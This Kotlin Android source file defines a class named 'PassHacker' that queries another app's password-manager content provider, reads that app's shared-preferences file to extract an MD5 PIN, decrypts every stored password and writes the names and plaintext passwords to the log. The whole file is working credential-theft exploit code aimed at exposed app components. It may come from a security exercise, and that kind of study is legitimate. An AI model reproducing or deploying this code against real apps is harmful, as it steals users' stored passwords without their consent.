package com.ruhlanusubov.byteninjax.extension

import android.net.Uri
import android.util.Log
import androidx.activity.ComponentActivity
import com.ruhlanusubov.byteninjax.model.UserDTO
import com.ruhlanusubov.byteninjax.util.Constants
import org.w3c.dom.Element
import org.xml.sax.InputSource
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.StringReader
import javax.xml.parsers.DocumentBuilderFactory

class PassHacker {
    private val contentProvider = Uri.parse("content://com.els.pwdmanager.contentprovider/pwds")
    private val fields = arrayOf("_id", "name", "pwd")

    companion object {
        fun parseXmlMD5(xmlContent: String?): String? {
            return try {
                val dbFactory = DocumentBuilderFactory.newInstance()
                val dBuilder = dbFactory.newDocumentBuilder()
                val inputSource = InputSource(StringReader(xmlContent))
                val doc = dBuilder.parse(inputSource).apply { documentElement.normalize() }
                val nodeList = doc.getElementsByTagName("string")
                (0 until nodeList.length)
                    .asSequence()
                    .map { nodeList.item(it) as Element }
                    .firstOrNull { it.getAttribute("name") == "MD5_PIN" }
                    ?.textContent
            } catch (e: Exception) {
                Log.e("XMLParseError", "Error parsing XML", e)
                null
            }
        }
    }

    fun getAppPassword(activity: ComponentActivity, appName: String): String? {
        val hash = getSharedPref(activity)
        return try {
            activity.contentResolver.query(contentProvider, fields, "name = ?", arrayOf(appName), null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"))
                    val name = cursor.getString(cursor.getColumnIndexOrThrow("name"))
                    val pwd = hash?.let { PassDecoder(it).decrypt(cursor.getString(cursor.getColumnIndexOrThrow("pwd"))) }
                    Log.e("pwd", "$id:$name:$pwd")
                    pwd
                } else null
            }
        } catch (e: Exception) {
            Log.e("ContentProviderError", "Error querying content provider", e)
            null
        }
    }

    fun queryPasswords(activity: ComponentActivity): ArrayList<UserDTO> {
        val hash = getSharedPref(activity)
        val users = ArrayList<UserDTO>()
        return try {
            activity.contentResolver.query(contentProvider, fields, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"))
                    val name = cursor.getString(cursor.getColumnIndexOrThrow("name"))
                    val pwd = hash?.let { PassDecoder(it).decrypt(cursor.getString(cursor.getColumnIndexOrThrow("pwd"))) }
                    pwd?.let { users.add(UserDTO(id, name, it)) }
                    Log.e("pwd", "$id:$name:$pwd")
                }
                users
            } ?: users
        } catch (e: Exception) {
            Log.e("ContentProviderError", "Error querying content provider", e)
            users
        }
    }

    private fun getSharedPref(activity: ComponentActivity): String? {
        val targURI = Uri.parse(Constants.TARGET_URI_PWD)
        return try {
            activity.contentResolver.openInputStream(targURI)?.use { content ->
                BufferedReader(InputStreamReader(content)).use { reader ->
                    val result = reader.readText()
                    parseXmlMD5(result)
                }
            }
        } catch (e: Exception) {
            Log.e("FileNotFound", "Error opening file", e)
            null
        }
    }
}